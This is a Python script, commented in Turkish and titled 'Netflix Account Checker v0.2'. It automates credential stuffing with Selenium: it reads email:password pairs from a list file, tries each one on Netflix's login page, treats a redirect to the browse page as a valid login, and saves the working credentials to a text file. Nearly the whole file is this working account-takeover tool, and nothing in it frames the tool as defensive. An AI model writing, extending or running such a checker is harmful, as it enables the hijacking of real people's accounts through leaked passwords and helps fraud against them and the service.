from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
import time

print ('[+]---Netflix Account Checker v0.2---[+]')
time.sleep(2)

# Geçerli ve geçersiz hesapları tutacak değişkenler
contex = 0
contno = 0

accPass = []  # Geçerli hesapların tutulacağı liste
outfile = open('netflix_worksAcc.txt', 'w')

# Selenium WebDriver başlatma
driver = webdriver.Chrome()  # veya Firefox, Edge vb.
driver.get('https://www.netflix.com/login')

# Hesapları kontrol etmek için thread fonksiyonu
def check_account(currentline):
    global contex, contno
    try:
        # E-posta ve şifre alanlarını bulma
        email_field = driver.find_element(By.NAME, 'userLoginId')
        password_field = driver.find_element(By.NAME, 'password')

        # Giriş bilgilerini girme
        email_field.send_keys(currentline[0])  # E-posta
        password_field.send_keys(currentline[1])  # Şifre
        password_field.send_keys(Keys.RETURN)  # Enter tuşuna basma

        time.sleep(5)  # Giriş işleminin tamamlanmasını bekleyin

        # Başarılı giriş kontrolü
        if driver.current_url == 'https://www.netflix.com/browse':
            print(f'{currentline[0]}:{currentline[1]} - Geçerli')  # Geçerli hesap
            contex += 1
            driver.get('https://www.netflix.com/SignOut?lnkctr=mL')  # Çıkış yap
            time.sleep(2)  # Çıkış yapmadan önce bekleyin
            accPass.append(currentline[0] + ':' + currentline[1])  # Geçerli hesapları kaydet
        else:
            print(f'{currentline[0]}:{currentline[1]} - Geçersiz')  # Geçersiz hesap
            contno += 1

        # Formu temizleyerek sonraki hesaba geçme
        email_field.clear()
        password_field.clear()

        # Sayfayı yenileme yerine form alanlarını sıfırlıyoruz
        email_field.send_keys(Keys.CONTROL + "a")  # Tüm yazıyı seç
        email_field.send_keys(Keys.DELETE)  # Yazıyı sil
        password_field.send_keys(Keys.CONTROL + "a")  # Tüm yazıyı seç
        password_field.send_keys(Keys.DELETE)  # Yazıyı sil

        time.sleep(1)  # Sayfayı sıfırlamak için kısa bir bekleme

        # Formu sıfırladıktan sonra yeni hesap için tekrar giriş yapılabilir
        email_field.clear()
        password_field.clear()

        # Sayfayı yenileyin, böylece eski hesap verileri temizlenir
        driver.refresh()
        time.sleep(2)  # Sayfa yenileme işlemi sonrası bekleyin

    except Exception as e:
        print(f'Error with {currentline[0]}:{currentline[1]} - {e}')
        email_field.clear()
        password_field.clear()
        driver.refresh()
        time.sleep(2)

# Hesapları topluca kontrol etme fonksiyonu
def check_accounts():
    global contex, contno
    try:
        with open("listAcc.txt", "r") as filestream:  # listAcc.txt dosyasındaki hesapları oku
            for line in filestream:
                currentline = line.strip().split(':')  # : ile ayırma
                # Hesapları kontrol et
                check_account(currentline)

        # Geçerli hesapları dosyaya yaz
        print('Writing valid accounts to file...')
        for account in accPass:
            outfile.write(account + '\n')

    except Exception as e:
        print('Something went wrong, saving progress...')
        print('Error:', e)
        for account in accPass:
            outfile.write(account + '\n')

    print(f'Geçerli hesaplar: {contex}')
    print(f'Geçersiz hesaplar: {contno}')

# Çalıştırma
if __name__ == "__main__":
    check_accounts()

    # WebDriver'ı kapatma
    driver.quit()